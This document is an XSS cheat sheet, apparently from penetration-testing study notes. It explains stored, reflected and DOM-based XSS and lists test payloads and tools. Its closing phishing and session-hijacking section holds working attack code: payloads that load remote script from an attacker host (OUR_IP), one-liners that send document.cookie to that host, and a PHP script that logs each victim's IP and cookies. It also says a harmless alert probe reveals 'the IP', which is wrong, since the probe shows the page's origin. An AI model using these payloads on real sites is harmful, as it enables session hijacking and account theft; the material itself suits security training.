# Stored XSS
This type of cross-site-scripting are persistent. The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments)

Try this code to see if the site is vulnerable:
```html
<script>alert(window.origin)</script>
```
If the code is running on the main application, the IP will be displayed.

---

# Reflected XSS
This type of cross-site-scripting are non-persistent. Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message)

Try this code to see if the site is vulnerable:
```html
<script>alert(window.origin)</script>
```
If the code is running on the main application, the IP will be displayed.

---

# DOM-Based XSS
Another Non-Persistent XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags)

JavaScript functions to write to DOM objects are:
-   `document.write()`
-   `DOM.innerHTML`
-   `DOM.outerHTML`

Furthermore, some of the `jQuery` library functions that write to DOM objects are:
-   `add()`
-   `after()`
-   `append()`

```html
<img src="" onerror=alert(window.origin)>
```

---

## Tools
> https://github.com/payloadbox/xss-payload-list
> https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md
- `XSSer`
- `XSStrike`
- `BruteXSS`


---

# Phishing

Another very common type of XSS attack is a phishing attack. Phishing attacks usually utilize legitimate-looking information to trick the victims into sending their sensitive information to the attacker. A common form of XSS phishing attacks is through injecting fake login forms that send the login details to the attacker's server, which may then be used to log in on behalf of the victim and gain control over their account and sensitive information.

### Session-Hijacking
For blind-XSS testing, try these payloads and see if they request your webserver:
```html
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```

Send cookie to yourself:
```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

PHP for `index.php` to parse the cookie:
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```